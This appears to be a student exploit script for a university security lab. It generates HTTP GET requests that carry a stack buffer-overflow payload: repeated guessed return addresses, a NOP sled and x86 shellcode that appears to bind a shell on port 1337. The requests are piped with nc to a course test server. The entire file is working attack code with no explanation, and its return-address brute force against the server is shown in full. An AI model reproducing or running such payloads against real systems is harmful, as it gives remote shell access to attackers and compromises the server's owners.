NOP = '\\x90\\x90\\x90\\x90'
SHELL = '\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6\\x56\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5f\\x97\\x93\\xb0\\x66\\x56\\x66\\x68\\x05\\x39\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x56\\x56\\x57\\x89\\xe1\\xcd\\x80\\x59\\x59\\xb1\\x02\\x93\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x41\\x89\\xca\\xcd\\x80'

def main():
    adr = 3221225471 # bfffffff
    f = open('shellcodes.txt', 'w')
    for n in range(50):
        adr_hex = hex(adr)[2:]
        f.write('echo -e "GET /')
        adr_shell = '\\x' + adr_hex[6:8] + '\\x' + adr_hex[4:6] + '\\x' + adr_hex[2:4] + '\\x' + adr_hex[0:2]
        for m in range(60):
            f.write(adr_shell)
        for m in range(127):
            f.write(NOP)
        f.write(SHELL)
        f.write(' HTTP" | nc 310test.cs.duke.edu 9091\n\n')
        adr -= 400
main()